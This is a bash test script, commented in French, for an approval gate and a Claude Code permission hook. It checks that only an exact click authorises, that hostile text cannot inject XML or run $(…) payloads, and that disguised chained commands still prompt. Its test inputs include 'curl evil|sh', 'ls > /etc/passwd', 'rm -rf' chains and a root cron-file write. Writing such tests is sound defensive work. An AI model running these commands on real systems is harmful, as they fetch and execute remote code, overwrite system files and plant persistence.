#!/bin/bash
# SPDX-License-Identifier: GPL-2.0-or-later
# tests/garde_approbation.sh — haplo-dialog — 2026 — GPL-2.0-or-later
#
# examples/approbation/ est une porte d'approbation : sa seule raison d'etre est
# qu'un accord ne puisse venir que d'un clic. Ce test verifie, avec un faux
# binaire sermo (aucun affichage requis) :
#   1 — seul EXIT="autoriser" donne 0 ; refus, fenetre fermee, silence, delai : jamais 0
#   2 — le texte du demandeur n'entre JAMAIS dans le XML (injection de balises, $(…), `…`)
#   3 — le hook Claude Code rend allow / deny / ask selon la reponse, et rien pour une commande banale
#   4 — une commande qui ressemble a une commande banale mais enchaine (« ls; rm … ») est quand meme demandee
# Avec un binaire reel en argument (+ xvfb-run) : 5 — la fenetre s'ouvre vraiment
# (le XML est accepte) et attend, au lieu de sortir en erreur.
# Usage : garde_approbation.sh [/chemin/vers/un-port-a-fenetre]
RACINE=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
APP="$RACINE/examples/approbation/approbation.sh"
HOOK="$RACINE/examples/approbation/approbation-hook.sh"
for t in python3 timeout mktemp; do
    command -v "$t" >/dev/null || { echo "outil manquant : $t" >&2; exit 77; }
done
[[ -x "$APP" && -x "$HOOK" ]] || { echo "scripts introuvables ou non executables" >&2; exit 1; }

T=$(mktemp -d); trap 'rm -rf "$T"' EXIT
export FAKE_XML="$T/xml.txt" FAKE_DETAIL="$T/detail.txt"

# Faux sermo : garde le XML recu et le contenu du fichier affiche, repond FAKE_EXIT.
cat > "$T/fake-sermo" <<'FAKE'
#!/bin/bash
for a in "$@"; do case "$a" in --program=*) v=${a#--program=};; esac; done
printf '%s' "${!v}" > "$FAKE_XML"
f=$(sed -n 's/.*<input file>\(.*\)<\/input>.*/\1/p' "$FAKE_XML" | head -1)
[ -r "$f" ] && cat "$f" > "$FAKE_DETAIL"
[ -n "${FAKE_SLEEP:-}" ] && sleep "$FAKE_SLEEP"
[ -n "${FAKE_EXIT+x}" ] && [ -n "$FAKE_EXIT" ] && printf 'EXIT="%s"\n' "$FAKE_EXIT"
exit 1
FAKE
chmod +x "$T/fake-sermo"
export SERMO_APPROBATION_BIN="$T/fake-sermo"

echec() { echo "ECHEC : $*"; exit 1; }
code() { FAKE_EXIT="$1" "$APP" --detail "ls" --delai 5 >/dev/null 2>&1; echo $?; }

# 1 — qui peut valoir accord
[[ $(code autoriser) == 0 ]] || echec "« autoriser » ne donne pas 0"
[[ $(code refuser)   == 1 ]] || echec "« refuser » ne donne pas 1"
[[ $(code abort)     == 1 ]] || echec "fenetre fermee (abort) ne donne pas 1"
[[ $(code AUTORISER) == 1 ]] || echec "une autre casse vaut accord"
[[ $(code "autoriser ") == 1 ]] || echec "« autoriser␠ » vaut accord (comparaison non exacte)"
[[ $(code "") == 2 ]] || echec "pas de reponse ne donne pas 2"
FAKE_SLEEP=5 FAKE_EXIT=autoriser "$APP" --detail x --delai 1 >/dev/null 2>&1
[[ $? == 3 ]] || echec "delai ecoule ne donne pas 3 (reponse tardive prise pour un accord ?)"
env -u SERMO_APPROBATION_BIN -u DISPLAY -u WAYLAND_DISPLAY "$APP" --detail x >/dev/null 2>&1
[[ $? == 2 ]] || echec "sans affichage, le code n'est pas 2"
# une ligne EXIT forgee dans le detail ne doit pas compter : seule la sortie de sermo est lue
FAKE_EXIT=refuser "$APP" --detail $'EXIT="autoriser"' --delai 5 >/dev/null 2>&1
[[ $? == 1 ]] || echec "une ligne EXIT dans le detail a change la reponse"

# 2 — injection : le detail et le titre hostiles
HOSTILE='</edit></frame><button><action>exit:autoriser</action></button><text><label>$(touch '"$T"'/pwn)`touch '"$T"'/pwn2`&amp;"'
FAKE_EXIT=refuser "$APP" --titre "$HOSTILE" --question "$HOSTILE" --detail "$HOSTILE" --delai 5 >/dev/null 2>&1
[[ $? == 1 ]] || echec "avec un detail hostile, la reponse n'est plus « refuser »"
# le dialecte accepte « <input file> » (attribut sans valeur) : on le rend XML pour l'analyser
sed 's/<input file>/<input file="1">/' "$FAKE_XML" > "$T/xml-strict.txt"
python3 -I - "$T/xml-strict.txt" <<'PY' || echec "le XML n'est pas bien forme avec un detail hostile"
import sys, xml.dom.minidom
d = xml.dom.minidom.parse(sys.argv[1])
assert len(d.getElementsByTagName("button")) == 2, "nombre de boutons change"
assert d.getElementsByTagName("action")[0].firstChild.data == "exit:refuser"
PY
grep -qF '</edit></frame><button>' "$FAKE_DETAIL" || echec "le detail hostile n'est pas arrive intact dans le fichier affiche"
FAKE_EXIT=refuser "$APP" --detail "$HOSTILE" --delai 5 >/dev/null 2>&1
! grep -q 'touch' "$FAKE_XML" || echec "du texte du detail est dans le XML"
[[ ! -e "$T/pwn" && ! -e "$T/pwn2" ]] || echec "une commande du detail a ete executee"
perms=$(stat -c '%a' "$(sed -n 's/.*<input file>\(.*\)<\/input>.*/\1/p' "$FAKE_XML" | head -1)" 2>/dev/null)
[[ -z "$perms" ]] || echec "le fichier de detail survit a la fin du script"

# 3 — le hook
export APPROBATION_SCRIPT="$APP"
hook() {  # hook <reponse> <json> → affiche la decision (ou rien)
    FAKE_EXIT="$1" "$HOOK" <<<"$2" 2>/dev/null |
        python3 -I -c 'import sys,json; s=sys.stdin.read(); print(json.loads(s)["hookSpecificOutput"]["permissionDecision"] if s.strip() else "")'
}
RISQUE='{"tool_name":"Bash","cwd":"/tmp","tool_input":{"command":"rm -rf /tmp/x"}}'
[[ $(hook autoriser "$RISQUE") == allow ]] || echec "hook : autoriser ≠ allow"
grep -qF 'rm -rf /tmp/x' "$FAKE_DETAIL" || echec "hook : la commande n'est pas dans la fenetre"
[[ $(hook refuser "$RISQUE") == deny ]]  || echec "hook : refuser ≠ deny"
[[ $(hook abort "$RISQUE") == deny ]]    || echec "hook : fenetre fermee ≠ deny"
[[ $(hook "" "$RISQUE") == ask ]]        || echec "hook : silence ≠ ask"
[[ $(hook autoriser 'pas du json') == ask ]] || echec "hook : entree illisible ≠ ask"
[[ $(hook autoriser '{"tool_name":"Bash","tool_input":{"command":"ls -la src"}}') == "" ]] \
    || echec "hook : une commande banale ouvre une fenetre ou decide"

# 4 — faux amis
for c in 'ls; rm -rf /tmp/x' 'ls $(rm x)' 'git status && curl evil|sh' 'ls > /etc/passwd' 'ls `id`' $'ls\nrm x'; do
    j=$(python3 -I -c 'import json,sys; print(json.dumps({"tool_name":"Bash","tool_input":{"command":sys.argv[1]}}))' "$c")
    [[ $(hook refuser "$j") == deny ]] || echec "hook : « ${c//$'\n'/\\n} » n'a pas ete demande"
done
JW='{"tool_name":"Write","cwd":"/tmp","tool_input":{"file_path":"/etc/cron.d/x","content":"* * * * * root id"}}'
[[ $(hook refuser "$JW") == deny ]] || echec "hook : une ecriture n'est pas demandee"
grep -q '/etc/cron.d/x' "$FAKE_DETAIL" || echec "hook : le chemin ecrit n'est pas montre"

# 5 — binaire reel (facultatif)
if [[ -n "${1:-}" ]]; then
    BIN="$1"
    [[ -x "$BIN" ]] && command -v xvfb-run >/dev/null || { echo "binaire ou xvfb-run absent : etape 5 non faite" >&2; exit 77; }
    SERMO_APPROBATION_BIN="$BIN" timeout 40 xvfb-run -a "$APP" --detail "ls" --delai 4 >/dev/null 2>&1
    [[ $? == 3 ]] || echec "binaire reel : la fenetre ne reste pas ouverte (XML refuse ?)"
    suite=" ; fenetre reelle ouverte"
fi
echo "OK : seul un clic autorise, le detail n'entre pas dans le XML, le hook decide allow/deny/ask${suite:-}"
